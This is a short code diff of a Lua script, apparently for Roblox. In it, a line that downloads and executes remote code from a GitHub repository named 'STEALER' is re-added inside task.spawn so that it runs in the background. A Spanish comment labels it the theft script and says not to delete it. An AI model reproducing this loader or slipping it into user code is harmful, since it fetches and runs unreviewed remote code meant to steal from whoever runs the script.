@@ -26,5 +26,6 @@ end)
 -- CARGA DEL script de robo NO BORRES ESTO 
 -- ==========================================
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
+task.spawn(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
+end)
